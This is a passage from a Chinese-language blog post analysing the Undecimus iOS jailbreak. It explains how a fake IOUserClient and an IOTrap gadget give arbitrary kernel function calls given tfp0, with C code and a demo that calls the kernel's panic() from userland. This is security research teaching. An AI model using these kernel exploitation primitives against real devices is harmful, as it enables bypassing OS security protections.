IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user-&gt;kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex</span></span><br><span class="line">    <span class="comment">// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.</span></span><br><span class="line">    <span class="comment">// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the</span></span><br><span class="line">    <span class="comment">// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed</span></span><br><span class="line">    <span class="comment">// through like normal.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it</span></span><br><span class="line">    <span class="comment">// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents</span></span><br><span class="line">    <span class="comment">// (i'm not actually sure if the switch back is necessary but meh)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// IOTrap starts at +0x40</span></span><br><span class="line">    <span class="comment">// fake_client 即我们构造的 userClient</span></span><br><span class="line">    <span class="comment">// 0ffx20 为 IOTrap-&gt;object，offx28 为 IOTrap-&gt;func，这里是对原始值进行备份</span></span><br><span class="line">    <span class="keyword">kptr_t</span> offx20 = ReadKernel64(fake_client + <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">kptr_t</span> offx28 = ReadKernel64(fake_client + <span class="number">0x48</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IOTrap-&gt;object = arg0</span></span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x40</span>, x0);</span><br><span class="line">    <span class="comment">// IOTrap-&gt;func = func_ptr</span></span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x48</span>, ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x1~x6 为函数的第 1 ~ 6 个参数，第 0 个参数通过 trap-&gt;object 传入</span></span><br><span class="line">    returnval = IOConnectTrap6(user_client, <span class="number">0</span>, x1, x2, x3, x4, x5, x6);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里对原始值进行恢复</span></span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x40</span>, offx20);</span><br><span class="line">    WriteKernel64(fake_client + <span class="number">0x48</span>, offx28);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    pthread_mutex_unlock(&amp;kexec_lock);</span><br><span class="line">    <span class="keyword">return</span> returnval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于上述讨论这段代码还是很好理解的，到这里非 arm64e 架构下的内核任意代码执行原理就讲解完了，有关 arm64e 的讨论将在下一篇文章中继续，下面我们用 kexec 做一个实验来验证 Primitive 的达成。</p>
<h1 id="kexec-实验"><a href="#kexec-实验" class="headerlink" title="kexec 实验"></a>kexec 实验</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>请读者打开 Undecimus 源码的 <code>jailbreak.m</code>，搜索 <code>_assert(init_kexec()</code> 定位到初始化 kexec 的代码，向上翻可以发现 kexec 的初始化被放到了 ShenanigansPatch 和 setuid(0) 之后。ShenanigansPatch 是用来解决内核对 sandbox 化进程的 ucred 检查而采取的绕过措施[3]，它是通过 String XREF 定位和修改内核全局变量实现的，有兴趣的读者可以自行阅读 <a href="https://stek29.rocks/2018/12/11/shenanigans.html" target="_blank" rel="noopener">Shenanigans, Shenanigans!</a> 来了解。</p>
<p>对于非 arm64e 设备，似乎仅通过 tfp0 即可实现 kexec，这段处理应该是针对 arm64e 设备绕过 PAC 所做的必要提权处理。</p>
<p><strong>我们的实验代码一定要放到 <code>init_kexec</code> 执行成功之后才行</strong>。</p>
<h2 id="获取一个内核函数的地址"><a href="#获取一个内核函数的地址" class="headerlink" title="获取一个内核函数的地址"></a>获取一个内核函数的地址</h2><p>在 Undecimus 中获得了许多关键函数的地址，它们通过声明一个名为 find_xxx 的导出符号实现动态查找和缓存，需要注意的是，在 kexec 初始化后 kerneldump 已经被释放，因此必须在初始化 kerneldump 时就计算好函数的地址。</p>
<p>我们先参考 Undecimus 是如何查找和缓存一个内核数据的，以 vnode_lookup 函数为例：<br>首先我们需要在 <code>patchfinder64.h</code> 中声明一个名为 <code>find_&lt;symbol_name&gt;</code> 的函数，它返回被查找符号的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">find_vnode_lookup</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>随后基于 String XREF 完成查找的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">addr_t</span> <span class="title">find_vnode_lookup</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">addr_t</span> hfs_str = find_strref(<span class="string">"hfs: journal open cb: error %d looking up device %s (dev uuid %s)\n"</span>, <span class="number">1</span>, string_base_pstring, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hfs_str) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    hfs_str -= kerndumpbase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">addr_t</span> call_to_stub = step64_back(kernel, hfs_str, <span class="number">10</span>*<span class="number">4</span>, INSN_CALL);</span><br><span class="line">    <span class="keyword">if</span> (!call_to_stub) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> follow_stub(kernel, call_to_stub);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随后在 kerneldump 阶段通过宏函数 find_offset 完成查找：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_offset(vnode_lookup, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>上述宏函数会动态调用 <code>find_&lt;symbol_name&gt;</code> 函数并将结果缓存起来，随后可通过 <code>getoffset</code> 宏函数来获取相应的偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kptr_t</span> <span class="keyword">const</span> function = getoffset(vnode_lookup);</span><br></pre></td></tr></table></figure>

<p>这里我们照猫画虎的创建一个 panic 函数偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">find_panic</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">addr_t</span> ref = find_strref(<span class="string">"\"shenanigans!"</span>, <span class="number">1</span>, string_base_pstring, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!ref) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ref + <span class="number">0x4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里查找的代码是位于 sandbox.kext 中的 panic 语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">panic(<span class="string">"\"shenanigans!\""</span>);</span><br></pre></td></tr></table></figure>

<p>通过 String XREF 我们能定位到 panic 调用前的 add 指令，下一条指令一定是 <code>bl _panic</code>，因此将查找结果 + 4 即可得到内核中 panic 函数的地址。</p>
<h2 id="调用内核函数"><a href="#调用内核函数" class="headerlink" title="调用内核函数"></a>调用内核函数</h2><p>在上文中我们找到了 panic 函数的地址，这里尝试用一个自定义字符串触发一个 kernel panic，注意由于 SMAP 的存在，panic string 要从 userland 拷贝到 kernel：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// play with kexec</span></span><br><span class="line"><span class="keyword">uint64_t</span> function = getoffset(panic);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *testStr = <span class="string">"this panic is caused by userland!!!!!!!!!!!!!!!"</span>;</span><br><span class="line"><span class="keyword">kptr_t</span> kstr = kmem_alloc(<span class="built_in">strlen</span>(testStr));</span><br><span class="line">kwrite(kstr, testStr, <span class="built_in">strlen</span>(testStr));</span><br><span class="line"><span class="keyword">kptr_t</span> ret = kexec(function, (<span class="keyword">kptr_t</span>)kstr, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL);</span><br><span class="line">NSLog(@<span class="string">"result is %@"</span>, @(ret));</span><br><span class="line">kmem_free(kstr, <span class="keyword">sizeof</span>(testStr));</span><br></pre></td></tr></table></figure>

<p>随后运行 Undecimus，会发生 kernel panic，为了验证我们成功调用了内核的 panic 函数，在 iPhone 上打开设置页，打开 <code>Privacy-&gt;Analytics-&gt;Analytics Data</code>，找到其中以 <code>panic-full</code> 开头的最新日志，如果试验成功可以看到如下内容：<br><img src="https://user-gold-cdn.xitu.io/2020/1/12/16f991d81a07fa8b?w=592&h=1280&f=png&s=673260" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文详细介绍了非 arm64e 架构下通过 tfp0 实现 kexec 的过程和原理，由此可以给读者构造 ROP Gadget 带来启发。从下一篇文章开始，我们将分析 PAC 缓解措施及其绕过技巧。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html#" target="_blank" rel="noopener">Brandon Azad, Project Zero. Examining Pointer Authentication on the iPhone XS</a></li>
<li><a href="https://www.cnblogs.com/malecrab/p/5572730.html" target="_blank" rel="noopener">Malecrab. C/C++杂记：虚函数的实现的基本原理</a></li>
<li><a href="https://stek29.rocks/2018/12/11/shenanigans.html" target="_blank" rel="noopener">stek29.rocks. Shenanigans, Shenanigans!</a></li>
<li><a href="https://github.com/pwn20wndstuff/Undecimus/blob/9d7a1076a2b088b25677f4a53822a3c396b1b837/Undecimus/source/jailbreak.m" target="_blank" rel="noopener">pwn20wndstuff. Undecimus</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">高级页面仔 (Soulghost)</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.asm.im/2020/01/12/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89%E9%80%9A%E8%BF%87-IOTrap-%E5%AE%9E%E7%8E%B0%E5%86%85%E6%A0%B8%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://blog.asm.im/2020/01/12/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89%E9%80%9A%E8%BF%87-IOTrap-%E5%AE%9E%E7%8E%B0%E5%86%85%E6%A0%B8%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JailBreak/">JailBreak</a><a class="post-meta__tags" href="/tags/Undecimus/">Undecimus</a><a class="post-meta__tags" href="/tags/KEXEC/">KEXEC</a><a class="post-meta__tags" href="/tags/JOP/">JOP</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/11/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%95%E8%BF%87-A12-%E7%9A%84-PAC-%E5%AE%9E%E7%8E%B0-kexec/"><i class="fa fa-chevron-left">  </i><span>Undecimus 分析（四）绕过 A12 的 PAC 实现 kexec</span></a></div><div class="next-post pull-right"><a href="/2019/12/29/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-String-XREF-%E5%AE%9A%E4%BD%8D%E5%86%85%E6%A0%B8%E6%95%B0%E6%8D%AE/"><span>Undecimus 分析（二）通过 String XREF 定位内核数据</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 高级页面仔 (Soulghost)</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>